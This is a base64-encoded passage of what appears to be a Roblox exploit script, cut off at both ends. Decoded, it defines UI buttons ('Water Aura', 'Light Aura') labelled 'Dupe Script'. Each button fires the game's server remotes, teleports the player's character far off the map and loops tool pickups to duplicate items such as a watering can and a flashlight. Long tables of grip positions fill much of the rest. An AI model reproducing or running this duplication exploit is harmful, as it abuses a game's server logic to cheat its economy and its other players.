yMy5uZXcoMTAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIC0zMCksICAgICAgICAgICAgICAgICAgICAgICAgICAKICBWZWN0b3IzLm5ldygtMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAtMzApLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAtMzApLAogIFZlY3RvcjMubmV3KC02MCwgMCwgLTMwKSwKICAgIFZlY3RvcjMubmV3KDAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoMTAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIC00NSksICAgICAgICAgICAgICAgICAgICAgICAgICAKICBWZWN0b3IzLm5ldygtMCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAtNDUpLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAtNDUpLAogIFZlY3RvcjMubmV3KC02MCwgMCwgLTQ1KSwKICAgIFZlY3RvcjMubmV3KDEwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KDIwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KDMwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KDQwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KDUwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KDYwLCAwLCAtNjApLCAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgVmVjdG9yMy5uZXcoLTAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoLTEwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KC0yMCwgMCwgLTYwKSwKICBWZWN0b3IzLm5ldygtMzAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoLTQwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KC01MCwgMCwgLTYwKSwKICBWZWN0b3IzLm5ldygtNjAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoMTAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIC03NSksICAgICAgICAgICAgICAgICAgICAgICAgICAKICBWZWN0b3IzLm5ldygtMCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAtNzUpLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAtNzUpLAogIFZlY3RvcjMubmV3KC02MCwgMCwgLTc1KSwKCgogICAgIH0KICAgICAgZm9yIGksIHRvb2wgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrR2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgIGlmIHRvb2xJc0EoVG9vbCkgdGhlbgogICAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgIGxvY2FsIGdyaXBQb3NJbmRleCA9IG1hdGgubWluKGksICNHcmlwUG9zVGFibGUpCiAgICAgICAgICAgICAgbG9jYWwgZ3JpcFBvcyA9IEdyaXBQb3NUYWJsZVtncmlwUG9zSW5kZXhdCiAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgaWYgdG9vbElzRGVzY2VuZGFudE9mKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIpIHRoZW4KICAgICAgICAgICAgICAgICAgdG9vbC5HcmlwUG9zID0gZ3JpcFBvcwogICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgd2FybihUb29sLCB0b29sLk5hbWUsIGlzIG5vdCBpbiBjaGFyYWN0ZXIpCiAgICAgICAgICAgICAgZW5kCiAgICAgICAgICBlbmQKICAgICAgZW5kICAgICAgICAgICAKICAgIGVuZAp9KQoKLS0gQnV0dG9uIGZvciBXYXRlciBBdXJhClRvb2xzVGFiQWRkQnV0dG9uKHsKICAgIE5hbWUgPSBXYXRlciBBdXJhLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbmFtZXRvb2xzID0gd2F0ZXIgU3ByYXkgbGVsCiAgICAgICAgICAgICAgICBvbGRjZnJhbWUgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lCmdhbWVHZXRTZXJ2aWNlKFN0YXJ0ZXJHdWkpU2V0Q29yZShTZW5kTm90aWZpY2F0aW9uLHtUaXRsZT1EdXBlIFNjcmlwdCxUZXh0PVBsZWFzZSBkbyBub3QgZXF1aXAgYW55IHRvb2xzIG9yIHVuZXF1aXAgdG9vbHMgb3IgY2xpY2sgdG9vbHMgb24gaW52ZW50b3J5LiBJdCB3aWxsIGJyZWFrIHRoZSBzY3JpcHQuLCBCdXR0b24xID0gSSB1bmRlcnN0YW5kICxEdXJhdGlvbj01fSkKICAgICAgICAgICAgICAgIHRvb2x0aGF0aXdhbnR0b2R1cGUgPSBXYXRlcmluZ0NhbgogICAgICAgICAgICAgICAgdG9vbHMgPSBXYXRlcmluZ0NhbgogICAgICAgICAgICAgICAgaWYgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPT0gdHJ1ZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID0gZmFsc2UKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgd2FpdCgwLjEpCiAgICAgICAgICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICAgICAgICAgICAgICBbMV0gPSBDbGVhckFsbFRvb2xzCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGNsZWFydG9vbHJlbW90ZUZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgICAgICAgICAgaWYgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpRmluZEZpcnN0Q2hpbGQoQ2FtZXJhKURlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgIGZvciBtPTEsMiBkbyB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg5OTk5OTk5OTkuNDE0LCAtNDkwLCA5OTk5OTk5OTkuNDE0LCAwLjk3NDM2MDQwNiwgLTAuMTc1NzM0MDg4LCAwLjE0MDQ5NzYxLCAtMC4xMzM0NDE0MDQsIDAuMDUxNDA1MzA2OSwgMC45ODk3MjI3MjksIC0wLjE4MTE1MDMwMiwgLTAuOTgzMDk0NjkyLCAwLjAyNjYzNzA5MjIpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4yKQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSB0cnVlCiAgICAgICAgICAgICAgICB3YWl0KDAuMykKICAgICAgICAgICAgICAgIGR1cGluZyA9IHRydWUKICAgICAgICAgICAgICAgIGZvciBtPTEsIDEyNCBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiBkdXBpbmcgPT0gZmFsc2UgdGhlbiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZSByZXR1cm4gZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSlGaW5kRmlyc3RDaGlsZChDYW1lcmEpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpRmluZEZpcnN0Q2hpbGQoQ2FtZXJhKURlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbMV0gPSBQaWNraW5nVG9vbHMsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWzJdID0gdG9vbHRoYXRpd2FudHRvZHVwZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBwaWNrdG9vbHJlbW90ZUludm9rZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkJhY2twYWNrV2FpdEZvckNoaWxkKHRvb2x0aGF0aXdhbnR0b2R1cGUpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgaWYgZHVwaW5nID09IGZhbHNlIHRoZW4gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UgcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgICAgICAgICB3YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyW3Rvb2x0aGF0aXdhbnR0b2R1cGVdRmluZEZpcnN0Q2hpbGQoSGFuZGxlKS5OYW1lID0gSMOiwiDCpWHDosIgwqVuw6LCIMKlZMOiwiDCpWzDosIgwqVlCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKHRvb2x0aGF0aXdhbnR0b2R1cGUpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgICAgICAgICAgICAgICAgICBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5CYWNrcGFja0ZpbmRGaXJzdENoaWxkKHRvb2x0aGF0aXdhbnR0b2R1cGUpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgcmVwZWF0ICAgICAgICAgICAgICAgICBpZiBnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpRmluZEZpcnN0Q2hpbGQoQ2FtZXJhKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSlEZXN0cm95KCkgZW5kIHdhaXQoKSB1bnRpbCBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKSA9PSBuaWwKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UKICAgICAgICAgICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEh1bWFub2lkUm9vdFBhcnQpID09IG5pbAogICAgICAgICAgICAgICAgcmVwZWF0IHdhaXQoKSB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWRSb290UGFydCkKICAgICAgICAgICAgICAgIHRvb2xncmlwID0gdHJ1ZQogICAgICAgICAgICAgICAgZHVwaW5nID0gZmFsc2UKICAgICAgICAgICAgICAgIHdhaXQoKQpsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWRXYWl0KCkKbG9jYWwgaHVtYW5vaWQgPSBjaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoSHVtYW5vaWQpCgoKcHJpbnQoZG9uZSkKd2FpdCgxKQpsb2NhbCBHcmlwUG9zVGFibGUgPSB7CiAgICAgICBWZWN0b3IzLm5ldygwLCAwLCAwKSwKICBWZWN0b3IzLm5ldygxMCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIDApLAogIFZlY3RvcjMubmV3KDMwLCAwLCAwKSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIDApLAogIFZlY3RvcjMubmV3KDYwLCAwLCAwKSwgICAgICAgICAgICAgICAgICAgICAgCiAgVmVjdG9yMy5uZXcoLTAsIDAsIDApLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAwKSwKICBWZWN0b3IzLm5ldygtMzAsIDAsIDApLAogIFZlY3RvcjMubmV3KC00MCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAwKSwKICBWZWN0b3IzLm5ldygtNjAsIDAsIDApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KDEwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldygzMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KDQwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldyg2MCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC0wLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoLTEwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoLTQwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KDEwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldygzMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KDQwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldyg2MCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC0wLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoLTEwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoLTQwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoMCwgMCwgMTUpLAogIFZlY3RvcjMubmV3KDEwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldygzMCwgMCwgMTUpLAogIFZlY3RvcjMubmV3KDQwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldyg2MCwgMCwgMTUpLCAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgVmVjdG9yMy5uZXcoLTAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldygtMjAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldygtMzAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldygtNTAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldygtNjAsIDAsIDE1KSwKVmVjdG9yMy5uZXcoMCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldygxMCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldygyMCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldygzMCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldyg1MCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldyg2MCwgMCwgLTE1KSwgICAgICAgICAgICAgICAgICAgICAgCiAgVmVjdG9yMy5uZXcoLTAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoLTEwLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KC0yMCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldygtMzAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoLTQwLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KC01MCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldygtNjAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygxMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygyMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygzMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldyg1MCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldyg2MCwgMCwgLTMwKSwgICAgICAgICAgICAgICAgICAgICAgICAgIAogIFZlY3RvcjMubmV3KC0wLCAwLCAtMzApLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygtMjAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCAtMzApLAogIFZlY3RvcjMubmV3KC00MCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygtNTAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCAtMzApLAogICAgVmVjdG9yMy5uZXcoMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygxMCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldygyMCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldygzMCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldyg1MCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldyg2MCwgMCwgLTQ1KSwgICAgICAgICAgICAgICAgICAgICAgICAgIAogIFZlY3RvcjMubmV3KC0wLCAwLCAtNDUpLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldygtMjAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCAtNDUpLAogIFZlY3RvcjMubmV3KC00MCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldygtNTAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCAtNDUpLAogICAgVmVjdG9yMy5uZXcoMTAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIC02MCksICAgICAgICAgICAgICAgICAgICAgICAgICAKICBWZWN0b3IzLm5ldygtMCwgMCwgLTYwKSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgLTYwKSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KC02MCwgMCwgLTYwKSwKICBWZWN0b3IzLm5ldygxMCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldygyMCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldygzMCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldyg1MCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldyg2MCwgMCwgLTc1KSwgICAgICAgICAgICAgICAgICAgICAgICAgIAogIFZlY3RvcjMubmV3KC0wLCAwLCAtNzUpLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldygtMjAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCAtNzUpLAogIFZlY3RvcjMubmV3KC00MCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldygtNTAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCAtNzUpLAoKCiAgICAgfQogICAgICBmb3IgaSwgdG9vbCBpbiBwYWlycyhnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgaWYgdG9vbElzQShUb29sKSB0aGVuCiAgICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgbG9jYWwgZ3JpcFBvc0luZGV4ID0gbWF0aC5taW4oaSwgI0dyaXBQb3NUYWJsZSkKICAgICAgICAgICAgICBsb2NhbCBncmlwUG9zID0gR3JpcFBvc1RhYmxlW2dyaXBQb3NJbmRleF0KICAgICAgICAgICAgICAKICAgICAgICAgICAgICBpZiB0b29sSXNEZXNjZW5kYW50T2YoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcikgdGhlbgogICAgICAgICAgICAgICAgICB0b29sLkdyaXBQb3MgPSBncmlwUG9zCiAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICB3YXJuKFRvb2wsIHRvb2wuTmFtZSwgaXMgbm90IGluIGNoYXJhY3RlcikKICAgICAgICAgICAgICBlbmQKICAgICAgICAgIGVuZAogICAgICBlbmQKICAgIGVuZAp9KQoKLS0gQnV0dG9uIGZvciBMaWdodCBBdXJhClRvb2xzVGFiQWRkQnV0dG9uKHsKICAgIE5hbWUgPSBMaWdodCBBdXJhLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbmFtZXRvb2xzID0gbGlnaHQgU3ByYXkgbGVsCiAgICAgICAgICAgICAgICBvbGRjZnJhbWUgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lCmdhbWVHZXRTZXJ2aWNlKFN0YXJ0ZXJHdWkpU2V0Q29yZShTZW5kTm90aWZpY2F0aW9uLHtUaXRsZT1EdXBlIFNjcmlwdCxUZXh0PVBsZWFzZSBkbyBub3QgZXF1aXAgYW55IHRvb2xzIG9yIHVuZXF1aXAgdG9vbHMgb3IgY2xpY2sgdG9vbHMgb24gaW52ZW50b3J5LiBJdCB3aWxsIGJyZWFrIHRoZSBzY3JpcHQuLCBCdXR0b24xID0gSSB1bmRlcnN0YW5kICxEdXJhdGlvbj01fSkKICAgICAgICAgICAgICAgIHRvb2x0aGF0aXdhbnR0b2R1cGUgPSBGbGFzaExpZ2h0CiAgICAgICAgICAgICAgICB0b29scyA9IEZsYXNoTGlnaHQKICAgICAgICAgICAgICAgIGlmIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID09IHRydWUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9IGZhbHNlCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIHdhaXQoMC4xKQogICAgICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgWzFdID0gQ2xlYXJBbGxUb29scwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBjbGVhcnRvb2xyZW1vdGVGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAgICAgICAgIGlmIGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSlGaW5kRmlyc3RDaGlsZChDYW1lcmEpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSlEZXN0cm95KCkgZW5kCiAgICAgICAgICAgICAgICBmb3IgbT0xLDIgZG8gdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoOTk5OTk5OTk5LjQxNCwgLTQ5MCwgOTk5OTk5OTk5LjQxNCwgMC45NzQzNjA0MDYsIC0wLjE3NTczNDA4OCwgMC4xNDA0OTc2MSwgLTAuMTMzNDQxNDA0LCAwLjA1MTQwNTMwNjksIDAuOTg5NzIyNzI5LCAtMC4xODExNTAzMDIsIC0wLjk4MzA5NDY5MiwgMC4wMjY2MzcwOTIyKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMikKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gdHJ1ZQogICAgICAgICAgICAgICAgd2FpdCgwLjMpCiAgICAgICAgICAgICAgICBkdXBpbmcgPSB0cnVlCiAgICAgICAgICAgICAgICBmb3IgbT0xLCAxMjQgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgZHVwaW5nID09IGZhbHNlIHRoZW4gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UgcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBpZiBnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpRmluZEZpcnN0Q2hpbGQoQ2FtZXJhKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSlEZXN0cm95KCkgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGFyZ3MgPSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWzFdID0gUGlja2luZ1Rvb2xzLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsyXSA9IHRvb2x0aGF0a